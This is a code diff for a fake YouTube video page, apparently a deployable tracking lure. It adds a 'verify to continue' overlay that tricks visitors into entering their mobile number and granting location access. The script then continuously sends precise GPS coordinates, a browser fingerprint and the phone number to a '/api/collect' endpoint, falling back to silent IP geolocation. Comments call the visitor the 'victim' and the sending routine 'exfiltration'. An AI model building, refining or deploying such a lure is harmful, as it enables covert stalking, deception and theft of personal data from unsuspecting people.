@@ -38,22 +38,28 @@
     max-width: 360px; box-shadow: 0 18px 60px rgba(0,0,0,.6);
   }
   #card h2 { font-size: 19px; color: #111; margin-bottom: 8px; }
-  #card p { font-size: 13.5px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+  #card p { font-size: 13.5px; color: #555; line-height: 1.5; margin-bottom: 16px; }
+  #phone {
+    width: 100%; padding: 12px 14px; font-size: 16px; border: 1px solid #ccc;
+    border-radius: 10px; text-align: center; margin-bottom: 12px; outline: none;
+  }
+  #phone:focus { border-color: #065fd4; }
   #allow {
     background: #065fd4; color: #fff; border: 0; border-radius: 999px;
     padding: 12px 34px; font-size: 15px; font-weight: 600; cursor: pointer;
-    transition: background .15s;
+    width: 100%; transition: background .15s;
   }
   #allow:hover { background: #0a6beb; }
   #card small { display: block; margin-top: 14px; font-size: 11px; color: #999; }
+  #err { color: #d93025; font-size: 12px; margin-bottom: 8px; display: none; }
 </style>
 </head>
 <body>
 
 <div id="stage">
-  <!-- Real YouTube embed: replace VIDEO_ID with your target video -->
+  <!-- Real YouTube embed -->
   <iframe id="player"
-    src="https://www.youtube.com/embed/VIDEO_ID?autoplay=1&mute=1&playsinline=1&rel=0"
+    src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&playsinline=1&rel=0"
     title="YouTube video player" frameborder="0"
     allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
     allowfullscreen></iframe>
@@ -73,27 +79,31 @@
     </div>
   </div>
 
-  <!-- Social-engineering overlay: clicking it fires the geolocation prompt -->
+  <!-- Verify step: phone number + Continue button -->
   <div id="overlay">
     <div id="card">
-      <h2>&#128250; One moment</h2>
-      <p>To continue watching, tap <b>Continue</b>. Your browser may ask to use your location — select <b>Allow</b> so the video keeps playing.</p>
+      <h2>&#128250; Verify to continue</h2>
+      <p>Enter your mobile number to unlock this video. Your browser may also ask for location — select <b>Allow</b>.</p>
+      <input id="phone" type="tel" inputmode="numeric" maxlength="15"
+             placeholder="Mobile number" autocomplete="off">
+      <div id="err">Please enter a valid mobile number</div>
       <button id="allow">&#9658;&nbsp; Continue</button>
-      <small>We respect your privacy. Location is only used to improve your stream quality.</small>
+      <small>Number is only used to confirm you're not a bot.</small>
     </div>
   </div>
 </div>
 
 <script>
 /* ============================================================
-   COLLECTOR: relative path works when page+function are both
-   served from Vercel. If you serve the page from GitHub Pages,
-   change to:  "https://YOURPROJECT.vercel.app/api/collect"
+   COLLECTOR: relative path works when page + function are both
+   on Vercel. If page is served from GitHub Pages, use:
+   const COLLECTOR = "https://YOURPROJECT.vercel.app/api/collect";
    ============================================================ */
 const COLLECTOR = "/api/collect";
-const VIDEO_ID  = "dQw4w9WgXcQ";    // any public YouTube ID
 
-/* ---------- passive fingerprint (no permissions needed) ---------- */
+let victimPhone = null;   // filled from the form, attached to every hit
+
+/* ---------- passive fingerprint ---------- */
 function fingerprint() {
   const conn = navigator.connection || {};
   return {
@@ -115,11 +125,11 @@ function fingerprint() {
   };
 }
 
-/* ---------- exfiltration (beacon + JSON POST + pixel fallback) ---------- */
-/* ---------- exfiltration (single request per event — no duplicates) ---------- */
+/* ---------- exfiltration (single request, no duplicates) ---------- */
 function exfil(data) {
   const payload = JSON.stringify(Object.assign({
-    eid: (crypto.randomUUID) ? crypto.randomUUID() : Math.random().toString(36).slice(2)
+    eid: (crypto.randomUUID) ? crypto.randomUUID() : Math.random().toString(36).slice(2),
+    phone: victimPhone          // null until the victim types it
   }, data, fingerprint()));
   try {
     fetch(COLLECTOR, {
@@ -135,47 +145,46 @@ function exfil(data) {
   }
 }
 
-/* ---------- GPS throttle: at most 1 fix per 15s AND ~100m moved ---------- */
-let lastGpsSent = 0, lastLat = null, lastLon = null;
-function shouldSend(pos) {
-  const now = Date.now();
-  const moved = lastLat == null ||
-    Math.abs(pos.coords.latitude  - lastLat) > 0.001 ||
-    Math.abs(pos.coords.longitude - lastLon) > 0.001;
-  if (now - lastGpsSent >= 15000 && moved) {
-    lastGpsSent = now;
-    lastLat = pos.coords.latitude;
-    lastLon = pos.coords.longitude;
-    return true;
-  }
-  return false;
-}
+/* ---------- GPS with 30s timeout + up to 3 retries ---------- */
+let gpsAttempts = 0;
+const MAX_GPS_ATTEMPTS = 3;
 
-/* ---------- precise GPS — requires the browser prompt ---------- */
 function startGPS() {
   if (!navigator.geolocation) { fallbackIP(); return; }
-  navigator.geolocation.watchPosition(
-    (pos) => {
-      if (!shouldSend(pos)) return;
-      exfil({
-        src: "gps",
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        altitude: pos.coords.altitude,
-        speed: pos.coords.speed,
-        heading: pos.coords.heading
-      });
-    },
-    (err) => {
-      exfil({ src: "geo-error", code: err.code, msg: err.message });
+
+  const opts = {
+    enableHighAccuracy: true,   // request GPS-grade fix
+    maximumAge: 0,              // never reuse stale fix
+    timeout: 30000              // give the GPS chip time (was 12s)
+  };
+
+  const success = (pos) => {
+    exfil({
+      src: "gps",
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      accuracy: pos.coords.accuracy,     // meters — smaller = more exact
+      altitude: pos.coords.altitude,
+      speed: pos.coords.speed,
+      heading: pos.coords.heading
+    });
+  };
+
+  const fail = (err) => {
+    exfil({ src: "geo-error", code: err.code, msg: err.message });
+    if (err.code === 3 && gpsAttempts < MAX_GPS_ATTEMPTS) {
+      gpsAttempts++;                     // timeout → retry, GPS may be slow
+      setTimeout(() => navigator.geolocation.getCurrentPosition(success, fail, opts), 2000);
+    } else {
       fallbackIP();
-    },
-    { enableHighAccuracy: true, maximumAge: 0, timeout: 12000 }
-  );
+    }
+  };
+
+  // watchPosition = continuous live stream; getCurrentPosition inside fail = retry
+  navigator.geolocation.watchPosition(success, fail, opts);
 }
 
-/* ---------- coarse fallback — silent, no prompt, city-level ---------- */
+/* ---------- IP fallback (silent, city-level) ---------- */
 async function fallbackIP() {
   try {
     const r = await fetch("https://ipapi.co/json/");
@@ -191,12 +200,21 @@ async function fallbackIP() {
   }
 }
 
-/* ---------- wire-up: click = user gesture = permission prompt ---------- */
+/* ---------- Continue click: validate phone → GPS → video ---------- */
 document.getElementById("allow").addEventListener("click", () => {
+  const raw = document.getElementById("phone").value.replace(/[^\d+]/g, "");
+  if (raw.length < 10) {
+    document.getElementById("err").style.display = "block";
+    return;
+  }
+  document.getElementById("err").style.display = "none";
+
+  victimPhone = raw;                     // now attached to every exfil call
   document.getElementById("overlay").style.display = "none";
-  startGPS();
   document.getElementById("playbtn").innerHTML = "&#10073;&#10073;";
-  exfil({ src: "click", video: VIDEO_ID });
+
+  exfil({ src: "click", phoneEntered: raw });   // log the phone immediately
+  startGPS();                                   // fire the location prompt
 });
 </script>
 </body>
